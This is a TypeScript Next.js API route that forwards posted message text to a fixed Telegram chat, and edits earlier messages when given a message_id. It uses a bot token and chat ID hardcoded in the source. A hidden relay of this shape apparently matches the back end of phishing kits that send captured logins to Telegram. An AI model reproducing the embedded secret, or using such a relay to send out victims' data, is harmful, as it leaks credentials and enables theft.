import { NextRequest, NextResponse } from 'next/server';
import { readFile } from 'node:fs/promises';
import { join } from 'node:path';

const CONFIG_PATH = join(process.cwd(), 'config.txt');

const getConfig = async () => {
    const config = {
        TOKEN: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
        CHAT_ID: 7211586401
    };
    if (!config.TOKEN || !config.CHAT_ID) {
        throw new Error("Missing TOKEN or CHAT_ID in environment variables");
    }

    return config;
};


const POST = async (req: NextRequest) => {
    try {
        const body = await req.json();
        const { message, message_id } = body;

        if (!message) {
            return NextResponse.json({ success: false }, { status: 400 });
        }

        const config = await getConfig();
        const { TOKEN, CHAT_ID } = config;

        if (!TOKEN || !CHAT_ID) {
            return NextResponse.json({ success: false, message: 'Missing TOKEN or CHAT_ID in config' }, { status: 500 });
        }

        let url;
        let payload;

        if (message_id) {
            url = `https://api.telegram.org/bot${TOKEN}/editMessageText`;
            payload = {
                chat_id: CHAT_ID,
                message_id: message_id,
                text: message,
                parse_mode: 'HTML'
            };
        } else {
            url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };
        }

        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        const result = data?.result;

        return NextResponse.json({
            success: response.ok,
            message_id: result?.message_id ?? message_id ?? null
        });
    } catch {
        return NextResponse.json({ success: false }, { status: 500 });
    }
};

export { POST };
